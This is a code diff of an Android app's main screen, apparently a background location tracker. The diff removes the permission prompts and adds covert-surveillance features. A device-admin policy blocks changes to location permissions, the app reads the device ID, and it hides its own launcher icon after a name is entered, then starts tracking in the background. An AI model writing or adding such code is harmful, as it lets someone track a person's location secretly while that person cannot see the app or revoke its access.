@@ -1,150 +1,142 @@
 package com.plcoding.backgroundlocationtracking
 
-import android.Manifest
 import android.content.*
-import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.util.Log
+import android.widget.Button
+import android.widget.EditText
 import android.widget.Toast
-import androidx.activity.ComponentActivity
-import androidx.activity.compose.setContent
-import androidx.activity.result.contract.ActivityResultContracts
-import androidx.activity.viewModels
-import androidx.core.content.ContextCompat
+import androidx.appcompat.app.AppCompatActivity
 import androidx.localbroadcastmanager.content.LocalBroadcastManager
-import com.plcoding.backgroundlocationtracking.ui.theme.BackgroundLocationTrackingTheme
+import com.plcoding.backgroundlocationtracking.admin.PolicyManager
+import android.content.pm.PackageManager
 
-class MainActivity : ComponentActivity() {
 
-    private val locationViewModel: LocationViewModel by viewModels()
+class MainActivity : AppCompatActivity() {
 
+    private lateinit var deviceId: String
+    private val prefs by lazy { getSharedPreferences("app_prefs", Context.MODE_PRIVATE) }
+
+    // BroadcastReceiver nhận dữ liệu location từ LocationService
     private val locationReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             intent?.let {
                 val lat = it.getDoubleExtra("latitude", 0.0)
                 val lon = it.getDoubleExtra("longitude", 0.0)
-                Log.d("MainActivity", "📡 Received broadcast: latitude=$lat, longitude=$lon")
+                val userName = it.getStringExtra("userName") ?: "unknown_user"
 
-                locationViewModel.updateLocation(lat, lon)
-                locationViewModel.setTracking(true)
-                Log.d("MainActivity", "✅ ViewModel updated with new location")
+                Log.d(
+                    "MainActivity",
+                    "📡 [Broadcast] latitude=$lat, longitude=$lon, user=$userName"
+                )
             }
         }
     }
 
-    private val requestForegroundLauncher =
-        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { perms ->
-            Log.d("MainActivity", "🔑 Foreground permission request result: $perms")
-
-            val fine = perms[Manifest.permission.ACCESS_FINE_LOCATION] ?: false
-            val coarse = perms[Manifest.permission.ACCESS_COARSE_LOCATION] ?: false
-            val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-                perms[Manifest.permission.POST_NOTIFICATIONS] ?: false else true
-
-            if (fine || coarse) {
-                Log.d("MainActivity", "✅ Foreground location permission granted")
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-                    ContextCompat.checkSelfPermission(
-                        this,
-                        Manifest.permission.ACCESS_BACKGROUND_LOCATION
-                    ) != PackageManager.PERMISSION_GRANTED
-                ) {
-                    Log.d("MainActivity", "⚠️ Requesting background location permission")
-                    requestBackgroundLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                } else {
-                    startLocationService()
-                }
-            } else {
-                Log.w("MainActivity", "❌ Foreground location permission denied")
-                Toast.makeText(this, "Cần cấp quyền vị trí để tiếp tục!", Toast.LENGTH_LONG).show()
-            }
-        }
-
-    private val requestBackgroundLauncher =
-        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
-            if (granted) {
-                Log.d("MainActivity", "✅ Background location permission granted")
-                startLocationService()
-            } else {
-                Log.w("MainActivity", "❌ Background location permission denied")
-                Toast.makeText(this, "Cần cấp quyền background location để tracking!", Toast.LENGTH_LONG).show()
-            }
-        }
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
         Log.d("MainActivity", "🎬 onCreate called")
-        setContent {
-            BackgroundLocationTrackingTheme {
-                TrackingScreen(locationViewModel)
+
+        // Lấy deviceId duy nhất của thiết bị
+        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+            ?: "unknown_device"
+        Log.d("MainActivity", "💡 DeviceId = $deviceId")
+
+        // Khởi tạo PolicyManager
+        val policyManager = PolicyManager(this)
+        if (policyManager.isAdminActive()) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                policyManager.blockLocationPermissionChanges()
             }
+            policyManager.enforceLocationPolicy()
         }
 
-        if (!hasAllPermissions()) {
-            Log.d("MainActivity", "⚠️ Missing permissions, requesting foreground permissions")
-            askForegroundPermissions()
-        } else {
-            Log.d("MainActivity", "✅ All permissions granted, starting service")
-            startLocationService()
-        }
+        // Xử lý UI nhập username
+        handleUI()
     }
 
     override fun onStart() {
         super.onStart()
-        Log.d("MainActivity", "📡 Registering locationReceiver")
+        Log.d("MainActivity", "▶️ onStart: register locationReceiver")
         LocalBroadcastManager.getInstance(this)
             .registerReceiver(locationReceiver, IntentFilter("LOCATION_UPDATE"))
     }
 
     override fun onStop() {
         super.onStop()
-        Log.d("MainActivity", "📴 Unregistering locationReceiver")
-        LocalBroadcastManager.getInstance(this)
-            .unregisterReceiver(locationReceiver)
+        Log.d("MainActivity", "🛑 onStop: unregister locationReceiver")
+        LocalBroadcastManager.getInstance(this).unregisterReceiver(locationReceiver)
     }
 
-    private fun askForegroundPermissions() {
-        val permissions = mutableListOf(
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION
-        )
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
+    /**
+     * Setup UI nhập userName
+     */
+    private fun handleUI() {
+        val etUserName = findViewById<EditText>(R.id.etUserName)
+        val btnSubmit = findViewById<Button>(R.id.btnSubmit)
 
-        Log.d("MainActivity", "🔑 Asking for foreground permissions: $permissions")
-        requestForegroundLauncher.launch(permissions.toTypedArray())
-    }
+        val savedName = prefs.getString("userName", null)
+        if (!savedName.isNullOrEmpty()) {
+            // Nếu đã có userName → khóa lại UI
+            etUserName.setText(savedName)
+            etUserName.isEnabled = false
+            btnSubmit.isEnabled = false
+            Log.d("MainActivity", "✅ userName đã lưu: $savedName")
 
-    private fun hasAllPermissions(): Boolean {
-        val fine = ContextCompat.checkSelfPermission(
-            this, Manifest.permission.ACCESS_FINE_LOCATION
-        ) == PackageManager.PERMISSION_GRANTED
-        val coarse = ContextCompat.checkSelfPermission(
-            this, Manifest.permission.ACCESS_COARSE_LOCATION
-        ) == PackageManager.PERMISSION_GRANTED
-        val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-            ContextCompat.checkSelfPermission(
-                this, Manifest.permission.POST_NOTIFICATIONS
-            ) == PackageManager.PERMISSION_GRANTED
-        else true
-        val background = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
-            ContextCompat.checkSelfPermission(
-                this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
-            ) == PackageManager.PERMISSION_GRANTED
-        else true
+            // Bắt đầu tracking ngay
+            startLocationService(savedName)
+        } else {
+            Log.d("MainActivity", "⚠️ userName chưa có → yêu cầu nhập")
 
-        Log.d("MainActivity", "🔍 Permission check: fine=$fine, coarse=$coarse, notif=$notif, background=$background")
-        return (fine || coarse) && notif && background
-    }
+            btnSubmit.setOnClickListener {
+                val name = etUserName.text.toString().trim()
+                if (name.isNotEmpty()) {
+                    prefs.edit().putString("userName", name).apply()
+                    Log.d("MainActivity", "📤 userName set: $name")
+                    Toast.makeText(this, "Xin chào $name", Toast.LENGTH_SHORT).show()
 
-    private fun startLocationService() {
-        Log.d("MainActivity", "🚀 Starting LocationService...")
-        Intent(applicationContext, LocationService::class.java).apply {
-            action = LocationService.ACTION_START
-            startService(this)
+                    // Start service
+                    startLocationService(name)
+
+                    // 👉 Ẩn icon app khỏi launcher sau khi nhập
+                    val pm = packageManager
+                    pm.setComponentEnabledSetting(
+                        ComponentName(this, MainActivity::class.java),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP
+                    )
+                    Log.d("MainActivity", "🚫 App icon hidden from launcher")
+
+                    // Đóng Activity
+                    finish()
+                } else {
+                    Toast.makeText(this, "Tên không được để trống!", Toast.LENGTH_SHORT).show()
+                }
+            }
         }
-        Toast.makeText(this, "Location tracking started", Toast.LENGTH_SHORT).show()
-        Log.d("MainActivity", "✅ LocationService started")
+    }
+
+    /**
+     * Bắt đầu tracking
+     */
+    private fun startLocationService(userName: String) {
+        Log.d("MainActivity", "🚀 startLocationService for user=$userName, device=$deviceId")
+
+        val intent = Intent(applicationContext, LocationService::class.java).apply {
+            action = LocationService.ACTION_START
+            putExtra("userName", userName)
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Log.d("MainActivity", "📌 Using startForegroundService")
+            startForegroundService(intent)
+        } else {
+            Log.d("MainActivity", "📌 Using startService")
+            startService(intent)
+        }
     }
 }
